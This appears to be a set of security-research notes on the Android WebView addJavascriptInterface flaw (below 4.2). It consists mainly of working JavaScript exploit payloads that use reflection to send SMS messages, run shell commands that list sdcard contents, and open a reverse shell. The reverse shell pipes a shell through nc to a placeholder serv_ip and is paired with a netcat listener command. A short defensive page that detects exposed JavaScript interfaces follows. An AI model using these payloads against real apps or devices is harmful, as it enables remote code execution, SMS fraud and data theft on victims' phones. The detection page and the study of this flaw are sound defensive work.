<uses-sdk
        android:minSdkVersion="11"
        android:targetSdkVersion="16" />
<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.SEND_SMS"/>

WebView webView =(WebView)findViewById(R.id.webView);
webView.getSettings().setJavaScriptEnabled(true);
webView.addJavascriptInterface(this, "injectedObj");
webView.loadUrl("file:///android_asset/index.html");


//index.html
//sendTextMessage

<script>
      var obj_smsManager = injectedObj.getClass().forName("android.telephony.SmsManager").getMethod("getDefault",null).invoke(null,null);
      obj_smsManager.sendTextMessage("5558",null,"test",null,null);
</script>

//readSdcard
<script>
      var i=0;
      function getContents(inputStream)
      {
        var contents = ""+i;
        var b = inputStream.read();
        var i = 1;
        while(b != -1) {
            var bString = String.fromCharCode(b);
            contents += bString;
            b = inputStream.read();
        }
        i=i+1;
        return contents;
       }
      
       function execute(cmdArgs)
       {
        for (var obj in window) {
            console.log(obj);
            if ("getClass" in window[obj]) {
                alert(obj);
                return window[obj].getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
             }
         }
       } 
      
      var p = execute(["/system/bin/sh", "-c", "ls -al /mnt/sdcard/"]);
      document.write(getContents(p.getInputStream()));
</script>
	
//server nc -lvvp port

//client
//remote shell	
<script>
	function execute(cmdArgs)
	{
	 return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
	}
	execute(["/system/bin/sh","-c","rm /data/local/tmp/f;mkfifo /data/local/tmp/f;cat /data/local/tmp/f|/system/bin/sh -i 2>&1| nc serv_ip port >/data/local/tmp/f"]);
</script>





//检测是否有js接口暴露
<!DOCTYPE html>
<html>
<head>
<meta charset="gb2312"/>
<title>WebView漏洞检测--捉虫猎手</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
</head>
<body>
<p>
提示：如何检测出“accessibility”和 “accessibilityTraversal”接口----设置-辅助功能-开启系统或第三方辅助服务<br><br>
<b><font color=red>如果当前app存在漏洞，将会在页面中输出存在漏洞的接口方便程序员做出修改：</font></b>
</p>
<script type="text/javascript">
function check()
{
    for (var obj in window) 
    {
        try {
            if ("getClass" in window[obj]) {
                try{
                    window[obj].getClass();
                    document.write('<span style="color:red">'+obj+'</span>');
                    document.write('<br />');
                }catch(e){
                }   
            }
        } catch(e) {
        }
    }
}
check();
</script>
</body>
</html>


1. WebView (< Android 4.2)
2. Android == 4.2 ,漏洞程序仍然可执行

Ref:
http://blog.csdn.net/androidsecurity/article/details/11131891
http://50.56.33.56/blog/?p=314
http://blog.kainaodong.com/?tag=searchboxjavabridge_

